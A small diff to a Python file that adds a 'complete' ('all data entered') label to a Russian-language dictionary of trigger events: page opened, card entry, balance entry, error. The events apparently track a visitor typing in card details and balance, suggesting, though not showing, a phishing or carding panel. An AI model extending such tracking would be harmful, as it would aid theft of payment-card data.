@@ -62,10 +62,11 @@ def is_super_admin(user_id: int) -> bool:
 
 
 _TRIGGER_LABELS = {
-    "open":    "открытие страницы",
-    "card":    "ввод карты",
-    "balance": "ввод баланса",
-    "error":   "ошибка",
+    "open":     "открытие страницы",
+    "card":     "ввод карты",
+    "balance":  "ввод баланса",
+    "error":    "ошибка",
+    "complete": "все данные введены",
 }
 
 
